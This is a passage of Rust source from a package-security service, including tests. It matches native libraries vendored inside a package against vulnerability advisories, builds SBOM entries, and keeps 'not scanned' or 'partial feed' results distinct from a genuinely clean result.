            let webp = only(&rows, "libwebp").advisories.expect("queried");
            assert_eq!(
                webp.len(),
                1,
                "the reused row carries no findings; they live on the scan it reused"
            );
            assert_eq!(webp[0].id, "CVE-2023-4863");
        }

        /// A package may carry two copies of the same library at different
        /// releases. Matching on name alone would attach the vulnerable copy's
        /// advisory to the patched one -- a false positive against a component
        /// that really was fixed, which is exactly how a panel loses its reader.
        #[tokio::test]
        async fn two_versions_of_one_library_do_not_share_advisories() {
            let Some(pool) = try_pool().await else {
                return;
            };
            let (artifact, repo) = seed(&pool).await;
            add_component(&pool, artifact, "libwebp", Some("1.3.2")).await;
            add_component(&pool, artifact, "libwebp", Some("1.3.3")).await;
            let scan = add_scan(&pool, artifact, repo, "complete").await;
            add_finding(
                &pool,
                scan,
                artifact,
                Finding {
                    component: "libwebp",
                    version: Some("1.3.2"),
                    cve: Some("CVE-2023-4863"),
                    source: "osv.dev (vendored)",
                    url: Some("https://osv.dev/vulnerability/OSV-2023-libwebp"),
                },
            )
            .await;

            let rows = vendored_advisories(&pool, artifact)
                .await
                .expect("query succeeds")
                .components;

            let vulnerable = rows
                .iter()
                .find(|c| c.version.as_deref() == Some("1.3.2"))
                .expect("the 1.3.2 row");
            let patched = rows
                .iter()
                .find(|c| c.version.as_deref() == Some("1.3.3"))
                .expect("the 1.3.3 row");

            assert_eq!(
                vulnerable.advisories.as_ref().map(Vec::len),
                Some(1),
                "the affected copy keeps its advisory"
            );
            assert_eq!(
                patched.advisories,
                Some(vec![]),
                "the patched copy is clean, not guilty by name"
            );
        }

        #[tokio::test]
        async fn an_artifact_with_no_components_yields_no_rows() {
            let Some(pool) = try_pool().await else {
                return;
            };
            let (artifact, _repo) = seed(&pool).await;
            let report = vendored_advisories(&pool, artifact)
                .await
                .expect("query succeeds");
            assert!(report.components.is_empty());
            assert!(
                report.scan.is_none(),
                "with nothing vendored there is no advisory question to have \
                 asked, so there is no feed status to attach to an empty panel"
            );
        }

        // -----------------------------------------------------------------------
        // advisory_id_from_url
        // -----------------------------------------------------------------------

        #[test]
        fn advisory_id_is_the_last_path_segment() {
            assert_eq!(
                advisory_id_from_url("https://osv.dev/vulnerability/OSV-2023-4863").as_deref(),
                Some("OSV-2023-4863")
            );
            assert_eq!(
                advisory_id_from_url("https://github.com/advisories/GHSA-aaaa-bbbb-cccc/")
                    .as_deref(),
                Some("GHSA-aaaa-bbbb-cccc")
            );
        }

        #[test]
        fn a_url_with_no_usable_segment_yields_no_id() {
            assert_eq!(advisory_id_from_url("https://osv.dev"), None);
            assert_eq!(advisory_id_from_url("https://osv.dev/"), None);
            assert_eq!(advisory_id_from_url(""), None);
        }
    }
}

/// Load an artifact's vendored native libraries as advisory-queryable
/// dependencies.
///
/// This is the join between "what is inside this package" and "what is known
/// to be wrong with it". Extraction records that a wheel contains
/// `libwebp 1.3.2`; nothing acts on that until the name and version reach an
/// advisory feed, and a component list nobody queries is inventory, not
/// security.
///
/// Every row is emitted with [`ECOSYSTEM_UNSCOPED`] rather than a guessed
/// ecosystem. A vendored `.so` belongs to no package ecosystem: advisories
/// for libwebp live under OSS-Fuzz, Debian, Alpine and Rocky, and picking one
/// would silently return nothing for the others -- a clean-looking result
/// produced by asking the wrong question.
///
/// Rows with no version are skipped. A version-less query matches every
/// advisory for that library name regardless of whether this build is
/// affected, which produces confident findings that are wrong; per the
/// ABI-version reasoning in migration 222, absent is better than incorrect.
/// Those components stay visible in the analysis view, they simply do not
/// generate findings.
pub async fn vendored_dependencies(
    db: &PgPool,
    artifact_id: Uuid,
) -> Result<Vec<crate::services::scanner_service::Dependency>> {
    let rows: Vec<(String, Option<String>)> = sqlx::query_as(
        "SELECT name, version FROM package_vendored_components \
         WHERE artifact_id = $1 AND version IS NOT NULL \
         ORDER BY name, version",
    )
    .bind(artifact_id)
    .fetch_all(db)
    .await
    .map_err(|e| AppError::Database(e.to_string()))?;

    Ok(rows
        .into_iter()
        .filter_map(|(name, version)| {
            version.map(|v| crate::services::scanner_service::Dependency {
                name,
                version: Some(v),
                ecosystem: crate::services::scanner_service::ECOSYSTEM_UNSCOPED.to_string(),
            })
        })
        .collect())
}

/// Load an artifact's vendored native libraries as SBOM inventory entries.
///
/// Sibling of [`vendored_dependencies`], and deliberately a *different* query:
/// inventory and advisory-matching have different admission rules. A
/// version-less component cannot be asked about at a feed -- see
/// [`vendored_dependencies`] for why -- but it absolutely belongs in the SBOM.
/// "This wheel carries a copy of libwebp and we could not pin which release"
/// is a fact a reader needs; omitting it would let the inventory imply the
/// library is not in there at all, which is the failure #903 exists to remove.
///
/// `purl` is passed through exactly as extraction stored it and is never
/// synthesised here. The extractor writes `pkg:generic/<name>@<version>` only
/// when it holds a real upstream version; a purl minted from an ABI number
/// would be a match key pointing confidently at the wrong release.
pub async fn vendored_packages(
    db: &PgPool,
    artifact_id: Uuid,
) -> Result<Vec<crate::models::security::RawPackage>> {
    let rows: Vec<(String, Option<String>, Option<String>)> = sqlx::query_as(
        "SELECT name, version, purl FROM package_vendored_components \
         WHERE artifact_id = $1 ORDER BY name, version",
    )
    .bind(artifact_id)
    .fetch_all(db)
    .await
    .map_err(|e| AppError::Database(e.to_string()))?;

    Ok(rows
        .into_iter()
        .map(
            |(name, version, purl)| crate::models::security::RawPackage {
                name,
                version: version.filter(|v| !v.is_empty()),
                purl,
                license: None,
                // Distinct from the dependency scanner's own
                // `dependency-scanner` target so an SBOM reader can tell a
                // library recovered from the package bytes apart from one the
                // package declared.
                source_target: Some("vendored-component".to_string()),
            },
        )
        .collect())
}

/// One advisory against one vendored component, in the shape the artifact UI
/// consumes.
///
/// `id` is non-optional on purpose: the client fails the whole parse on an
/// entry without one rather than dropping it silently, and it is right to.
/// An advisory list that quietly lost a row renders as a shorter, cleaner
/// list, which is the failure direction that matters here.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct ComponentAdvisory {
    pub id: String,
    pub severity: String,
    pub summary: Option<String>,
    pub url: Option<String>,
}

/// Whether an advisory feed was consulted for this artifact, and how it went.
///
/// DELIBERATELY SEPARATE from [`Completeness`], which is ARCHIVE-read
/// completeness -- how much of the package the unpacker managed to read. Both
/// have a `partial`, and they are different failures that happen to share an
/// English word:
///
/// * archive `partial` means the package was truncated, and the component list
///   below may be missing entries entirely;
/// * advisory `partial` means every component was found but a feed did not
///   answer about them.
///
/// Folding either into the other fabricates the one that did not happen: a
/// truncated archive would report a feed outage, and a feed outage on a
/// fully-read package would claim files went unread. Two fields, always.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AdvisoryScanStatus {
    /// A dependency scan completed and every feed it consulted answered, so a
    /// component's empty advisory list is a real, earned clean result.
    Ok,
    /// No dependency scan has completed for this artifact yet. Nothing has
    /// asked, so nothing may be reported clean.
    NotRun,
    /// A scan ran and at least one feed did not answer. Its silence is not an
    /// all-clear.
    Partial,
}

impl AdvisoryScanStatus {
    /// The stable wire form. An open union on the client: an unrecognised
    /// value narrows to "unknown", which asserts neither `ok` nor `partial`.
    pub fn as_str(self) -> &'static str {
        match self {
            AdvisoryScanStatus::Ok => "ok",
            AdvisoryScanStatus::NotRun => "not_run",
            AdvisoryScanStatus::Partial => "partial",
        }
    }
}

/// The advisory-feed status for an artifact, with the sentence explaining it.
///
/// `reason` is non-null exactly when `status` is not `ok`, mirroring the CHECK
/// that governs [`Completeness`]'s reason in migration 221. It is rendered to
/// a user verbatim, so it is written as a sentence someone can act on rather
/// than as a code they would have to look up.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AdvisoryScan {
    pub status: AdvisoryScanStatus,
    pub reason: Option<String>,
}

impl AdvisoryScan {
    pub fn ok() -> Self {
        Self {
            status: AdvisoryScanStatus::Ok,
            reason: None,
        }
    }

    pub fn not_run() -> Self {
        Self {
            status: AdvisoryScanStatus::NotRun,
            reason: Some(
                "No dependency scan has completed for this artifact yet, so its \
                 bundled libraries have not been checked against an advisory feed."
                    .to_string(),
            ),
        }
    }

    /// The specific failure ("OSV returned 503") is not recoverable here: it
    /// is logged by the scanner and never persisted -- `complete_scan` does
    /// not write `error_message`, and a stale value left on the row from an
    /// earlier attempt would be worse than none, because it would be rendered
    /// verbatim as though it described this outage.
    pub fn partial() -> Self {
        Self {
            status: AdvisoryScanStatus::Partial,
            reason: Some(
                "An advisory feed did not answer during the last scan, so these \
                 components were not fully checked. Re-scan this artifact to try \
                 again."
                    .to_string(),
            ),
        }
    }
}

/// Per-component advisory state plus the feed status that qualifies it.
pub struct VendoredAdvisoryReport {
    /// `None` only when the artifact vendors nothing: with no components there
    /// is no advisory question to have asked, and reporting a feed status
    /// would attach a banner to an empty panel.
    pub scan: Option<AdvisoryScan>,
    pub components: Vec<ComponentAdvisories>,
}

/// What we know about advisories for one vendored component.
///
/// The whole type exists for the `Option`. `Some([])` means a feed was asked
/// and answered "nothing known"; `None` means nobody asked, or the asking did
/// not complete. Those are opposite facts, and collapsing them into an empty
/// list is precisely how a statically-linked libwebp renders as
/// "No vulnerabilities detected".
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ComponentAdvisories {
    /// The component's name, as stored -- the join key back to the row.
    pub component: String,
    pub version: Option<String>,
    /// `None` when this component was never queried, or was queried by a scan
    /// that did not complete. Never `Some([])` in either of those cases.
    pub advisories: Option<Vec<ComponentAdvisory>>,
}

/// One `scan_findings` row as this module reads it:
/// `(affected_component, affected_version, cve_id, title, severity, source_url)`.
type VendoredFindingRow = (
    String,
    Option<String>,
    Option<String>,
    String,
    String,
    Option<String>,
);

/// A vendored component's identity for matching purposes: name AND version.
///
/// Name alone is not a key. The unique index on `package_vendored_components`
/// is `(artifact_id, name, COALESCE(version, ''))`, so one package may carry
/// two copies of the same library at different releases -- and the older
/// copy's advisory must not be attached to the newer one, which is the false
/// positive that teaches a reviewer to ignore the panel.
type ComponentKey = (String, Option<String>);

/// Recover an advisory's own identifier from the URL the scanner built for it.
///
/// Not inference: `DependencyScanner` constructs these URLs from the id
/// (`https://osv.dev/vulnerability/OSV-2023-...`, and GitHub's own
/// `https://github.com/advisories/GHSA-...`), so taking the last path segment
/// is the exact inverse of how the value was written. Used only when the
/// finding carries no CVE alias, which is the ordinary case for an OSS-Fuzz
/// or vendor advisory that has not been assigned a CVE.
fn advisory_id_from_url(url: &str) -> Option<String> {
    // Strip the scheme first. Without that, `https://osv.dev` splits on `/`
    // into a last segment of `osv.dev`, and the host gets published as an
    // advisory id -- a plausible-looking string in the field the client keys
    // on, which is worse than the missing value it replaces.
    let after_scheme = url.split_once("://").map(|(_, rest)| rest).unwrap_or(url);
    let (_host, path) = after_scheme.trim_end_matches('/').split_once('/')?;
    let last = path.rsplit('/').next().unwrap_or_default().trim();
    if last.is_empty() {
        return None;
    }
    Some(last.to_string())
}

/// Load per-component advisory state for an artifact's vendored libraries.
///
/// This is the read side of the write path in
/// [`crate::services::scanner_service::DependencyScanner`], and it inherits
/// that path's discipline about what an empty result is allowed to mean. A
/// component's `advisories` is `None` -- "not queried", which the UI renders
/// with copy saying it is *not* a clean result -- in each of three cases:
///
/// 1. **The component has no recovered version.** It is deliberately never
///    sent to a feed: a version-less query matches every advisory ever filed
///    against the name regardless of whether this build is affected. See
///    [`vendored_dependencies`].
/// 2. **No dependency scan has completed for this artifact.** Nothing has
///    asked yet. Absence of findings here is absence of a question, not an
///    answer.
/// 3. **The scan that ran was `partial`.** An advisory feed did not answer,
///    so its silence is not an all-clear. This is the case that makes the
///    whole distinction worth carrying: a momentary OSV outage must not
///    publish an emerald "No known advisories" badge.
///
/// Only when a completed, `complete` dependency scan covered the artifact does
/// a component get `Some(list)` -- and then an empty list is a real, earned
/// "nothing known".
pub async fn vendored_advisories(db: &PgPool, artifact_id: Uuid) -> Result<VendoredAdvisoryReport> {
    let components: Vec<(String, Option<String>)> = sqlx::query_as(
        "SELECT name, version FROM package_vendored_components \
         WHERE artifact_id = $1 ORDER BY name, version",
    )
    .bind(artifact_id)
    .fetch_all(db)
    .await
    .map_err(|e| AppError::Database(e.to_string()))?;

    if components.is_empty() {
        return Ok(VendoredAdvisoryReport {
            scan: None,
            components: Vec::new(),
        });
    }

    // The most recent dependency scan for this artifact. A deduplicated row
    // (#033) holds no findings of its own -- they live on the scan it reused
    // -- so resolve through `source_scan_id` before looking them up, or every
    // reused scan would report every component as clean.
    let scan: Option<(Uuid, String)> = sqlx::query_as(
        "SELECT COALESCE(source_scan_id, id), scan_completeness \
         FROM scan_results \
         WHERE artifact_id = $1 AND scan_type = 'dependency' AND status = 'completed' \
         ORDER BY created_at DESC LIMIT 1",
    )
    .bind(artifact_id)
    .fetch_optional(db)
    .await
    .map_err(|e| AppError::Database(e.to_string()))?;

    // Case 2 and case 3: nothing queried these components, or the query did
    // not complete. Either way no component may claim to be clean.
    let scan_id = match scan {
        Some((id, completeness)) if completeness == "complete" => id,
        other => {
            return Ok(VendoredAdvisoryReport {
                scan: Some(match other {
                    // A scan ran; a feed inside it did not answer.
                    Some(_) => AdvisoryScan::partial(),
                    // Nothing has run at all.
                    None => AdvisoryScan::not_run(),
                }),
                components: components
                    .into_iter()
                    .map(|(component, version)| ComponentAdvisories {
                        component,
                        version,
                        advisories: None,
                    })
                    .collect(),
            });
        }
    };

    // `source LIKE '% (vendored)'` is the marker `DependencyScanner` writes so
    // a finding against a bundled library is distinguishable from one against
    // a declared dependency. Matching on it here keeps a declared `libwebp`
    // dependency's advisory from being re-reported as a vendored one.
    let rows: Vec<VendoredFindingRow> = sqlx::query_as(
        "SELECT affected_component, affected_version, cve_id, title, severity, \
                source_url \
         FROM scan_findings \
         WHERE scan_result_id = $1 AND affected_component IS NOT NULL \
           AND source LIKE '%(vendored)' \
         ORDER BY affected_component, severity, title",
    )
    .bind(scan_id)
    .fetch_all(db)
    .await
    .map_err(|e| AppError::Database(e.to_string()))?;

    let mut by_component: std::collections::HashMap<ComponentKey, Vec<ComponentAdvisory>> =
        std::collections::HashMap::new();
    // Components whose list we could not render in full. Reported as "not
    // queried" rather than as a short list: a list the client believes is
    // complete, and is not, is worse than an honest unknown.
    let mut unrenderable: std::collections::HashSet<ComponentKey> =
        std::collections::HashSet::new();

    for (component, affected_version, cve_id, title, severity, source_url) in rows {
        let key = (component, affected_version);
        let id = cve_id.filter(|c| !c.is_empty()).or_else(|| {
            source_url
                .as_deref()
                .and_then(advisory_id_from_url)
                .filter(|s| !s.is_empty())
        });

        match id {
            Some(id) => by_component
                .entry(key)
                .or_default()
                .push(ComponentAdvisory {
                    id,
                    severity,
                    summary: Some(title),
                    url: source_url,
                }),
            None => {
                // Unreachable by construction: every finding this path writes
                // carries either a CVE alias or a feed URL built from the
                // advisory id. Handled anyway, because the alternative is
                // emitting an entry with no `id` -- which the client rejects,
                // failing the parse for the whole artifact.
                tracing::warn!(
                    "Vendored advisory for {} on artifact {} has neither a CVE \
                     id nor a usable source URL; reporting the component as \
                     not queried rather than shortening its list",
                    key.0,
                    artifact_id
                );
                unrenderable.insert(key);
            }
        }
    }

    let components = components
        .into_iter()
        .map(|key| {
            // Case 1: never asked about, because we could not pin a version.
            let advisories = if key.1.is_none() || unrenderable.contains(&key) {
                None
            } else {
                Some(by_component.get(&key).cloned().unwrap_or_default())
            };
            let (component, version) = key;
            ComponentAdvisories {
                component,
                version,
                advisories,
            }
        })
        .collect();

    Ok(VendoredAdvisoryReport {
        scan: Some(AdvisoryScan::ok()),
        components,
    })
}
